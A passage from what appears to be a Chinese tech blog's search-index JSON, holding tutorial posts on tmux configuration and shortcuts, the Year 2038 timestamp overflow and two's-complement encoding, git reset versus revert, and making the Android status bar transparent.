~/.tmux.conf # 将默认修饰键（prefix） ctrl + b 修改：ctrl + a set -g prefix C-a unbind C-b bind C-a send-prefix # 激活鼠标模式 set-option -g -q mouse on # 修改分屏快捷键 # 左右分屏 bind h split-window -h # 上下分屏 bind v split-window -v # 可以取消默认的分屏快捷键映射 # unbind \u0026#39;\u0026#34;\u0026#39; # unbind % # 将 tmux 的复制模式键绑定设置为 vi 模式 setw -g mode-keys vi # windows 和 panes 的序号从 1 开始 set -g base-index 1 setw -g pane-base-index 1 重新加载 Tmux 配置文件\ntmux source-file ~/.tmux.conf 命令 \u0026amp; 快捷键 命令 这些命令大多是用于 tmux Session 的增删改查，一些命令进入 tmux 后将无法使用\n# 创建新的 session tmux new -s \u0026lt;session-name\u0026gt; # 删除 seesion tmux kill-session -t 0 # 重命名 seesion tmux rename-session -t 0 \u0026lt;new-name\u0026gt; # 查看 所有 session tmux ls # 进入最近使用的 session tmux attach # 进入编号为 1 的 session tmux attach -t 1 可以定义一些 alias 简化输入\n# 添加到 shell 初始化脚本中 # Bash Shell 是 ~/.bashrc # Zsh Shell 是 ~/.zshrc alias tnew=\u0026#39;tmux new -s\u0026#39; alias tatt=\u0026#39;tmux attach\u0026#39; alias tkill=\u0026#39;tmux kill-session -t\u0026#39; alias tkillall=\u0026#39;tmux kill-session -a\u0026#39; alias tname=\u0026#39;tmux rename-session -t\u0026#39; alias tls=\u0026#39;tmux ls\u0026#39; 快捷键 在使用下面的快捷键之前，都需要先按 tmux 的修饰键（prefix），修改后的修饰键为：Ctrl + a；具体做法是：先按住 Ctrl 再按一下 a，这时可以松开 Ctrl 和 a，这时 prefix 已经生效了，我们可以加上下面的任意按键以实现对应的功能\ntmux 有 Session、Window、Pane 这三个比较重要的概念\n会话 Seesion d：分离会话（detach） $：修改当前 Session 名称 s：显示 Session 列表（session） 窗口 Window c：创建一个新的 Window (create) p：切换到上一个 Window（previous） n：切换到下一个 Window（next） w：显示 Window 列表（window） ,：修改当前 Window 的名称 数字键：切换到对应编号的 Window，比如 prfix + 0 就是切换到编号为 0 的 Window 窗格 Pane %：创建一个 Pane（水平排布），使用前面的配置后，可以使用 h（horizontal） \u0026ldquo;：创建一个 Pane（垂直排布），使用前面的配置后，可以使用 v（vertical） 空格：Pane 的垂直排布和水平排布之间相互转换 x：移除当前 Pane，会出现提示是否需要 kill-pane，输入 y 确认，也可以使用 ctrl + d（无需按 prefix）直接终止 pane z：全屏当前 Pane ;：将光标移动到上次使用的 Pane o：将光标移动到下一个 Pane（顺时针） Ctrl + o：旋转当前窗口的pane，下一个 Pane 会代替上一 Pane 的位置，光标会保持在原 Pane Alt + 方向键：以 5 个单元格为单位移动边缘以调整当前面板大小 复制文本 [：进入复制模式，因为我们配置了 setw -g mode-keys vi 所以我们可以直接用 vim 的快捷键跳转单词或者行 我们可以通过 空格键 开始选中，这时移动光标可以扩大选取，按 回车 完成文本复制\n]：粘贴复制的文本 进入复制模式后，可以通过 q 退出复制模式\n场景 tmux 就像 vim 一样，如果不经常使用，就很容易忘记快捷键，可以通过一个场景把这些零碎的知识串起来，同时场景也方便重复练习和举一反三\n我们可以在 tmux 里，编译运行一个 c 的 hello world，prefix 默认为 Ctrl + b，配置里我们修改为 Ctrl + a\n使用 tmux 创建新的 Session，并指定名称为：run-c # 使用 alias 的话可以用 tnew run-c tmux new -s run-c 我们可以使用 prefix + , 将 Windows 名称修改为 hello-world\n使用 vim 编辑 hello.c\nvim hello.c 按 i 进入 vim 的编辑模式，输入：\n#include\u0026lt;stdio.h\u0026gt; int main(){ printf(\u0026#34;hello world\\n\u0026#34;); } 按ESC 退出编辑模式，键入 :w 保存输入\n使用 prefix + % （修改了配置则可以使用 prefix + h）在右侧添加一个新的 Pane 用于编译\n新增的 Pane 将屏幕一分为二，但是编译不需要这么大，我们可以通过 prefix + Alt + 右方向键 缩小 Pane 宽度，按完 prefix 后，可以多次按 Alt + 右方向键 持续缩小 Pane 宽度\n在右侧 Pane 我们可以使用 gcc hello.c 编译 hello.c\n使用 ./a.out 运行 hello world 程序\n使用 prefix + ;，将光标切换回左侧 Pane，如果觉想暂时收起右侧的 Pane，可以用 prefix + z，最大化或取消最大化当前 Pane\n我们可以继续编辑文件，输入 i 进入 vim 编辑模式，将 world，修改为 tmux，按ESC 退出编辑模式，键入 :w 保存输入\n使用 prefix + ;，将光标切换回右侧 Pane，完成编译和运行\ngcc hello.c ./a.out 使用 prefix + x，关闭右侧 Pane，按 y 确认关闭\n使用 prefix + d（tmux detach），将当前会话与窗口分离，回到我们自己的 Shell\n使用 tmux attach（修改了配置则可以使用 tatt），回到我们刚出 detach 的 Session\n参考资料 tmux: some considerations, some best practices How to Boost 10X Productivity with Tmux Tmux 使用教程 - 阮一峰 手把手教你使用终端复用神器 tmux Tmux + Vim 工作流! 同时操作多个项目, 追求极致的丝滑流畅! 「TMUX」十分钟掌握 tmux \u0026ndash; 高效的终端复用工具 : ) 十分钟掌握 TMUX Y分钟速成X，其中 X=tmux Tmux的快捷键,包括调整窗口大小\n","permalink":"https://aaronlinv.github.io/posts/%E5%BF%AB%E9%80%9F%E9%87%8D%E6%8B%BE-tmux-/","summary":"\u003cp\u003e\u003ccode\u003eTmux\u003c/code\u003e 是一个 Linux （Mac OS也支持）下的终端复用器，相较于 \u003ccode\u003eScreen\u003c/code\u003e 更为强大，但快捷键和操作逻辑也更复杂，一段时间不用，就很容易忘记相关的命令和快捷键。本文旨在通过一个简单的场景，快速重拾 Tmux\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eTmux\u003c/code\u003e 通常用来保持会话（session），如果我们通过 ssh 连接服务器处理打包等的耗时操作，那么网络波动可能会导致连接断开，使得操作失败，使用 \u003ccode\u003eTmux\u003c/code\u003e 会话会被保持，任务依然会继续，我们可以随时恢复会话\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eTmux\u003c/code\u003e 另一个常用的功能是分屏，快速地创建 \u003ccode\u003eWindow\u003c/code\u003e 和 \u003ccode\u003ePane\u003c/code\u003e，方便地在不同的任务间穿梭\u003c/p\u003e\n\u003ch2 id=\"修改配置\"\u003e修改配置\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evim ~/.tmux.conf\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 将默认修饰键（prefix） ctrl + b 修改：ctrl + a\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eset\u003c/span\u003e -g prefix C-a\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eunbind C-b\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ebind\u003c/span\u003e C-a send-prefix\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 激活鼠标模式\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eset-option -g -q mouse on\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 修改分屏快捷键\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 左右分屏\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ebind\u003c/span\u003e h split-window -h\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 上下分屏\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ebind\u003c/span\u003e v split-window -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 可以取消默认的分屏快捷键映射\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# unbind \u0026#39;\u0026#34;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# unbind %\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 将 tmux 的复制模式键绑定设置为 vi 模式\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esetw -g mode-keys vi\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# windows 和 panes 的序号从 1 开始 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eset\u003c/span\u003e -g base-index \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esetw -g pane-base-index \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e重新加载 Tmux 配置文件\u003c/p\u003e","title":"快速重拾 Tmux"},{"content":"Year 2038 problem 在 CS50 第 01 讲：C语言 中，提到了一个很有趣的问题：Year 2038 problem，这个问题指的是：一些使用 32 位来存储时间戳的计算机，在 2038 年，可能会出现整数溢出的问题，导致计算机的时间倒退回 1901 年\n时间戳 指得是：UTC 1970 年 1 月 1 日 0 时 0 分 0 秒到现在经历的秒数，用时间戳就可以表示当前的时间\n为什么会出现这个问题呢？因为时间总是在流逝，所以每时每刻时间戳都在增加，但是 32 位的存储空间是有限的，总有一天会超出所能存放的最大值，而反直觉的是在超过了最大值后并不是归零（时间戳回到 1970），而是倒退到了更前的 1901 年，对应下面的表格我们就可以更直观地看到几个时间戳对应的具体时间\n时间戳 对应的 UTC 时间 0 1970-01-01 00:00:00 2147483647 （32 位 int 最大整数值：2^31 - 1） 2038-01-19 03:14:07 -2147483648 （32 位 int 最小整数值：-2^31） 1901-12-13 20:45:52 可以看到当存储超过位数能容纳的最大值时，该值会从一个非常大的正数突然变为一个非常小的负数，所以导致了日期回到了 1901 年\n原码、反码、补码 计算机底层是通过二进制的方式存储整数，两者转换可以参考文章：二进制和十进制之间的互相转换，除了整数的大小，还需要存储的是整数的正负，一般首位（最高位）用于存储正负，0 代表该整数为正数，1 代表该数为负数，将一个整数对应的二进制数转化为计算机存储的二进制数，这个变换就是《数字逻辑电路》里面经常提到的原码、反码、补码转化。注意：正数和 0 的原码、反码、补码相同，负数则需要转换\n我们回顾一下，以 4 位二进制表示的整数举例：0 的原反补码都是 0000，1 的原反补码都是 0001，而 -1 该如何表示呢？\n将 -1 的绝对值（1）的二进制 001 加上符号位（负数用 1）构造出原码 1001 符号位为不变，其余的按位取反转化为反码 001 就变成了 110，加上符号位，得到反码 1110 反码 +1 就成了补码 1111 补码就是机器存储的形式。具体的规则可以参考：原码, 反码, 补码 详解\n整数的二进制编码 为什么要有这么复杂的原反补码的转换呢？直接最高位表示正负，其余位数表示数值这样不是很清晰吗？我们以 4 位为例，用二进制数表示数值，最高位表示符号，0 为 正数，1 为负数，其余三位表示数值，这种做法会有两个问题：\n0 会重复，即出现正零（0000）和负零（1000），造成浪费 不利于计算机减法运算的设计，计算机计算减法的时候不能像人一样考虑借位 那么如何解决这个问题呢？解决方法就是把减法变成加法，加法对于计算机来说很容易。减去一个数就等于加上这个数的相反数，即 1 - 2 = 1 + (-2) = -1，如果把这个过程映射到数轴上就会容易理解一点，把负数接在 0 的前面，1 - 2 就可以理解为在 -2 的位置上，再加上 1，那结果是 -1，下面的数轴分别表示整数的值（真值）和其对应的补码\n从二进制的角度来看 0000 的前面是什么？我们可以理解为是 1111，因为当 1111 加上 1 的时候本来应该是 10000，但由于位数的限制，最高位溢出，我们可以当成是 0000，有了这种编码方式，上面的两个问题都解决了\n现在再来看原码、反码、补码，就会通透一些，0 和 正整数的原反补相同，而负数，以 -1 为例，其绝对值 1 的原码 0001，对其修改，把符号位改为 1，其余位按位取反，得到 -1 的反码1110，对照数轴会发现 1110 其实是 -2 对应的补码，如果再把 1110 加 1，就变成了 1111 这就是 -1 的补码。我们可以理解为：正数转负数的这个过程本来是对称的过程，只要把正整数的补码映射到数轴的另一侧对应的位置即可，但是由于我们没有负零，所以需要往右边挪一个位置\n将数轴连成圈，我们就可以很直观地看到，当整数到了其位数能表达的最大正数（7）后再加 1，此时进位，数值位变为了 000 而符号为了 1，而 1000 则是 4 位二进制表示的最小的负整数（-8），这就是为什么 32 位时间戳经过了 2038-01-19 03:14:07 却直接跳到了 1901-12-13 20:45:52\n连成圈后也可以很直观地看出来，四位二进制，除去一位符号位，还有三位，2^3 = 8，可以表示 8 个整数，可以分别表示 8 个正整数和负整数，实际上 0 占用了正整数一个位置（0000），这也是为什么 Java Integer 的最大值的绝对值比最小值的绝对值小 1 了。最小值是 -2147483648（2^31），而最大值是 2147483647（2^31 - 1）\n参考资料 Why has the Int32 type a maximum value of 2³¹ − 1?\n","permalink":"https://aaronlinv.github.io/posts/32-%E4%BD%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%97%B6%E9%97%B4%E6%88%B3%E6%BA%A2%E5%87%BA%E7%9A%84%E6%80%9D%E8%80%83--%E6%95%B4%E6%95%B0%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA/","summary":"\u003ch2 id=\"year-2038-problem\"\u003eYear 2038 problem\u003c/h2\u003e\n\u003cp\u003e在 \u003ca href=\"https://www.bilibili.com/video/BV1ER4y157uA?t=8486.3\"\u003eCS50 第 01 讲：C语言\u003c/a\u003e 中，提到了一个很有趣的问题：\u003ca href=\"https://en.wikipedia.org/wiki/Year_2038_problem\"\u003eYear 2038 problem\u003c/a\u003e，这个问题指的是：一些使用 32 位来存储时间戳的计算机，在 2038 年，可能会出现整数溢出的问题，导致计算机的时间倒退回 1901 年\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://zh.wikipedia.org/wiki/UNIX%E6%97%B6%E9%97%B4\"\u003e时间戳\u003c/a\u003e 指得是：UTC 1970 年 1 月 1 日 0 时 0 分 0 秒到现在经历的秒数，用时间戳就可以表示当前的时间\u003c/p\u003e\n\u003cp\u003e为什么会出现这个问题呢？因为时间总是在流逝，所以每时每刻时间戳都在增加，但是 32 位的存储空间是有限的，总有一天会超出所能存放的最大值，而反直觉的是在超过了最大值后并不是归零（时间戳回到 1970），而是倒退到了更前的 1901 年，对应下面的表格我们就可以更直观地看到几个时间戳对应的具体时间\u003c/p\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e时间戳\u003c/th\u003e\n          \u003cth\u003e对应的 UTC 时间\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e0\u003c/td\u003e\n          \u003ctd\u003e1970-01-01 00:00:00\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e2147483647 （32 位 int 最大整数值：2^31 - 1）\u003c/td\u003e\n          \u003ctd\u003e2038-01-19 03:14:07\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e-2147483648  （32 位 int 最小整数值：-2^31）\u003c/td\u003e\n          \u003ctd\u003e1901-12-13 20:45:52\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e可以看到当存储超过位数能容纳的最大值时，该值会从一个非常大的正数突然变为一个非常小的负数，所以导致了日期回到了 1901 年\u003c/p\u003e\n\u003ch2 id=\"原码反码补码\"\u003e原码、反码、补码\u003c/h2\u003e\n\u003cp\u003e计算机底层是通过二进制的方式存储整数，两者转换可以参考文章：\u003ca href=\"https://zhuanlan.zhihu.com/p/75291280\"\u003e二进制和十进制之间的互相转换\u003c/a\u003e，除了整数的大小，还需要存储的是整数的正负，一般首位（最高位）用于存储正负，0 代表该整数为正数，1 代表该数为负数，将一个整数对应的二进制数转化为计算机存储的二进制数，这个变换就是《数字逻辑电路》里面经常提到的原码、反码、补码转化。注意：正数和 0 的原码、反码、补码相同，负数则需要转换\u003c/p\u003e\n\u003cp\u003e我们回顾一下，以 4 位二进制表示的整数举例：0 的原反补码都是 \u003ccode\u003e0000\u003c/code\u003e，1 的原反补码都是 \u003ccode\u003e0001\u003c/code\u003e，而 -1 该如何表示呢？\u003c/p\u003e","title":"32 位计算机时间戳溢出的思考 —— 整数的二进制表示"},{"content":"Git 中回退有 reset 和 revert，这两个的区别就是是否保留更改记录\n假设当前的提交情况是：A \u0026lt;- B \u0026lt;- C \u0026lt;- D \u0026lt;- HEAD，如下图：\n当前是 D，希望回退到 A，那我们可以使用 reset 命令，reset 后再看 git log 就会发现：B \u0026lt;- C \u0026lt;- D 宛如没有出现过，这适用于想完全舍弃 A 之后的修改\n但是如果我们想保留 B \u0026lt;- C \u0026lt;- D 的修改记录，可能这三个 commit 的功能只是暂时用不到，以后可能还用到，或者可能当前分支是一个公共分支，B \u0026lt;- C \u0026lt;- D 可能已经被同步到了其他小伙伴电脑上，为了尽量避免代码冲突。这些情况就需要使用 revert 命令，这样会重新生成新的 commit，其中包含回退的记录（假设 D 这个 commit 是添加了一些代码，那么 revert D 的 commit 就是删除这些代码）\nreset 使用 git reset A ，reset 会修改 head 的指向，这样可以回滚到 A，默认使用的参数是 --mixed，这个参数决定了 reset 时 Git 该如何处理工作区和暂存区\n一般地，我们对于代码的修改会体现在 working tree（工作区）的变动，通过 git add 添加即将要提交的文件到 index（暂存区），通过 git commit 再提交到 repository（本地仓库），如下图：\n查看帮助：git help reset\ngit reset [\u0026lt;mode\u0026gt;] [\u0026lt;commit\u0026gt;] This form resets the current branch head to \u0026lt;commit\u0026gt; and possibly updates the index (resetting it to the tree of \u0026lt;commit\u0026gt;) and the working tree depending on \u0026lt;mode\u0026gt;. If \u0026lt;mode\u0026gt; is omitted, defaults to --mixed. The \u0026lt;mode\u0026gt; must be one of the following: --soft Does not touch the index file or the working tree at all --mixed Resets the index but not the working tree --hard Resets the index and working tree 假设我们现在处在 D，那么分别会有三种 reset 的情况\n我们执行 git reset --soft A，字面意思，轻柔地 reset，只将 repository 回滚到了 A，而 working tree、index 维持 reset 之前的状态，保持不变，这个时候直接执行 commit，这时候会得到一个和 D 修改内容相同的 commit D'（二者的 commit id 是不相同的），--soft 很适合呈现多次 commit 的修改的叠加效果，假设 B、C、D 都是针对某一个功能的修改，其中的 commit 可能修改了同一个文件，想整合这些 commit 都修改了哪些内容，就可以使用 --soft 从 D reset 到 A，那么 B、C、D 的修改都会出现在 index 中 我们执行 git reset --mixed A，repository、index 会回滚，working tree 维持 reset 之前的状态，这个时候直接 commit，将无法提交，因为 repository 与 index 都被回滚了，二者是相同的，没有变化则无法提交 commit 我们执行 git reset --hard A，按照参数 hard 的字面意思，reset 的非常强硬，repository、index、working tree 都会回滚到 A，因为 working tree 工作区也回滚了，所以本地的所有修改也将丢失，--hard 相对来说比较危险，需要确保工作区没有需要保留的代码，--hard 适合的情况是对于当前的即将要提交的代码失去信心，准备推倒重来 revert 如果想在回滚的同时保留 commit 记录，就需要使用 revert，revert 就是生成原 commit 逆向修改的 commit，从而实现会滚。当前是 D，希望回退到 A，就需要按顺序依次 revert D、C、B ：\ngit revert D git revert C git revert B 每一次 revert 都会生成新的 commit，需要依次手动输入 commit message，也可以先 revert 最后集中 commit\ngit revert --no-commit D git revert --no-commit C git revert --no-commit B git commit -m \u0026#34; Revert D C B\u0026#34; 使用 revert 需要注意，如果即将 revert 的 commit 是一个 merge commit，那么会出现错误\n使用 reset 方式，创建回滚的 commit 如果需要保留回滚记录，但是需要 revert 的 commit 是 merge commit，那就必须手动指定 mainline，比较麻烦，可以用 reset 的方式创建回滚 commit，这种方式不受 merge 方式的影响：\ngit reset --hard A git reset --soft D git commit -m \u0026#34; Revert D C B\u0026#34; 通过这种方式也能回滚回 A，并且生成一个新的 commit，其中包括了 D、C、B 的逆向修改：\n先 reset --hard 到 A，这时 repository、index、working tree 都会回滚到 A 再 reset --soft 到 D，这时 repository 指向了 D，但是 index 和 working tree 还保持在 A，当前即将 commit 的就是 B、C、D 逆向修改的叠加 因为目前 head 已经指向了 A，所以通过 git log 无法查询到 D 对应的 commit id，此时可以通过 git reflog 查询到历史的提交记录 参考资料 Pretty Git branch graphs\ngit revert 用法\ngit reset soft,hard,mixed之区别深解\nWhat\u0026rsquo;s the difference between git reset \u0026ndash;mixed, \u0026ndash;soft, and \u0026ndash;hard?\nHow can I revert multiple Git commits?\nUnderstanding Git — Index\n相关阅读：Git 常见操作梳理\n","permalink":"https://aaronlinv.github.io/posts/git-%E4%B8%AD%E7%9A%84%E5%9B%9E%E9%80%80%E6%93%8D%E4%BD%9Creset-%E5%92%8C-revert/","summary":"\u003cp\u003eGit 中回退有 \u003ccode\u003ereset\u003c/code\u003e 和 \u003ccode\u003erevert\u003c/code\u003e，这两个的区别就是是否保留更改记录\u003c/p\u003e\n\u003cp\u003e假设当前的提交情况是：\u003ccode\u003eA \u0026lt;- B \u0026lt;- C \u0026lt;- D \u0026lt;- HEAD\u003c/code\u003e，如下图：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"../Git%E4%B8%AD%E7%9A%84%E5%9B%9E%E9%80%80%E6%93%8D%E4%BD%9C%EF%BC%9Areset%E5%92%8Crevert/1929786-20220707135502142-725016820.png\"\u003e\u003c/p\u003e\n\u003c!-- raw HTML omitted --\u003e\n\u003cp\u003e当前是 \u003ccode\u003eD\u003c/code\u003e，希望回退到 \u003ccode\u003eA\u003c/code\u003e，那我们可以使用 \u003ccode\u003ereset\u003c/code\u003e 命令，reset 后再看 git log 就会发现：\u003ccode\u003eB \u0026lt;- C \u0026lt;- D\u003c/code\u003e 宛如没有出现过，这适用于想完全舍弃 \u003ccode\u003eA\u003c/code\u003e 之后的修改\u003c/p\u003e\n\u003cp\u003e但是如果我们想保留 \u003ccode\u003eB \u0026lt;- C \u0026lt;- D\u003c/code\u003e 的修改记录，可能这三个 commit 的功能只是暂时用不到，以后可能还用到，或者可能当前分支是一个公共分支，\u003ccode\u003eB \u0026lt;- C \u0026lt;- D\u003c/code\u003e 可能已经被同步到了其他小伙伴电脑上，为了尽量避免代码冲突。这些情况就需要使用 \u003ccode\u003erevert\u003c/code\u003e 命令，这样会重新生成新的 commit，其中包含回退的记录（假设 \u003ccode\u003eD\u003c/code\u003e 这个 commit 是添加了一些代码，那么 revert \u003ccode\u003eD\u003c/code\u003e 的 commit 就是删除这些代码）\u003c/p\u003e\n\u003ch2 id=\"reset\"\u003ereset\u003c/h2\u003e\n\u003cp\u003e使用 \u003ccode\u003egit reset A\u003c/code\u003e ，reset 会修改 head 的指向，这样可以回滚到 \u003ccode\u003eA\u003c/code\u003e，默认使用的参数是 \u003ccode\u003e--mixed\u003c/code\u003e，这个参数决定了 \u003ccode\u003ereset\u003c/code\u003e 时 Git 该如何处理工作区和暂存区\u003c/p\u003e","title":"Git 中的回退操作：reset 和 revert"},{"content":"在使用 Navigation Drawer Activity 模版的时候，遇到了通知栏无法完全沉浸的问题，尝试搜索一些现有的解决方法，但是或多或少都会存在一些问题，通过反复尝试找到找到了一种比较靠谱的思路\n环境 测试模拟器：Pixel 3A\ncompileSdk：32\nminSdk：28\ntargetSdk：32\n创建工程 默认效果展示： 修改步骤 设置状态栏变为透明：修改主题配置 \u0026lt;item name=\u0026#34;android:statusBarColor\u0026#34; tools:targetApi=\u0026#34;l\u0026#34;\u0026gt;?attr/colorPrimaryVariant\u0026lt;/item\u0026gt; 修改为：\n\u0026lt;item name=\u0026#34;android:statusBarColor\u0026#34;\u0026gt;@android:color/transparent\u0026lt;/item\u0026gt; 修改后完整文件：\n\u0026lt;resources\u0026gt; \u0026lt;!-- Base application theme. --\u0026gt; \u0026lt;style name=\u0026#34;Theme.MyApplication\u0026#34; parent=\u0026#34;Theme.MaterialComponents.DayNight.DarkActionBar\u0026#34;\u0026gt; \u0026lt;!-- Primary brand color. --\u0026gt; \u0026lt;item name=\u0026#34;colorPrimary\u0026#34;\u0026gt;@color/purple_500\u0026lt;/item\u0026gt; \u0026lt;item name=\u0026#34;colorPrimaryVariant\u0026#34;\u0026gt;@color/purple_700\u0026lt;/item\u0026gt; \u0026lt;item name=\u0026#34;colorOnPrimary\u0026#34;\u0026gt;@color/white\u0026lt;/item\u0026gt; \u0026lt;!-- Secondary brand color. --\u0026gt; \u0026lt;item name=\u0026#34;colorSecondary\u0026#34;\u0026gt;@color/teal_200\u0026lt;/item\u0026gt; \u0026lt;item name=\u0026#34;colorSecondaryVariant\u0026#34;\u0026gt;@color/teal_700\u0026lt;/item\u0026gt; \u0026lt;item name=\u0026#34;colorOnSecondary\u0026#34;\u0026gt;@color/black\u0026lt;/item\u0026gt; \u0026lt;!-- Status bar color. --\u0026gt; + \u0026lt;item name=\u0026#34;android:statusBarColor\u0026#34;\u0026gt;@android:color/transparent\u0026lt;/item\u0026gt; \u0026lt;!-- Customize your theme here. --\u0026gt; \u0026lt;/style\u0026gt; \u0026lt;style name=\u0026#34;Theme.MyApplication.NoActionBar\u0026#34;\u0026gt; \u0026lt;item name=\u0026#34;windowActionBar\u0026#34;\u0026gt;false\u0026lt;/item\u0026gt; \u0026lt;item name=\u0026#34;windowNoTitle\u0026#34;\u0026gt;true\u0026lt;/item\u0026gt; \u0026lt;/style\u0026gt; \u0026lt;style name=\u0026#34;Theme.MyApplication.AppBarOverlay\u0026#34; parent=\u0026#34;ThemeOverlay.AppCompat.Dark.ActionBar\u0026#34; /\u0026gt; \u0026lt;style name=\u0026#34;Theme.MyApplication.PopupOverlay\u0026#34; parent=\u0026#34;ThemeOverlay.AppCompat.Light\u0026#34; /\u0026gt; \u0026lt;/resources\u0026gt; 修改后的效果： 打开抽屉发现已经透明，但是会覆盖一层浅色阴影\n在布局中增加 fitsSystemWindows 属性 在 app_bar_main.xml 的 androidx.coordinatorlayout.widget.CoordinatorLayout 和 com.google.android.material.appbar.AppBarLayout 中增加：android:fitsSystemWindows=\u0026quot;true\u0026quot;，这样它会自动的给View增加一个值等于状态栏高度的 PaddingTop，让它的背景颜色占据状态栏\n完整代码：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;androidx.coordinatorlayout.widget.CoordinatorLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; xmlns:app=\u0026#34;http://schemas.android.com/apk/res-auto\u0026#34; xmlns:tools=\u0026#34;http://schemas.android.com/tools\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; + android:fitsSystemWindows=\u0026#34;true\u0026#34; tools:context=\u0026#34;.MainActivity\u0026#34;\u0026gt; \u0026lt;com.google.android.material.appbar.AppBarLayout android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; + android:fitsSystemWindows=\u0026#34;true\u0026#34; android:theme=\u0026#34;@style/Theme.MyApplication.AppBarOverlay\u0026#34;\u0026gt; \u0026lt;androidx.appcompat.widget.Toolbar android:id=\u0026#34;@+id/toolbar\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;?attr/actionBarSize\u0026#34; android:background=\u0026#34;?attr/colorPrimary\u0026#34; app:popupTheme=\u0026#34;@style/Theme.MyApplication.PopupOverlay\u0026#34; /\u0026gt; \u0026lt;/com.google.android.material.appbar.AppBarLayout\u0026gt; \u0026lt;include layout=\u0026#34;@layout/content_main\u0026#34; /\u0026gt; \u0026lt;com.google.android.material.floatingactionbutton.FloatingActionButton android:id=\u0026#34;@+id/fab\u0026#34; 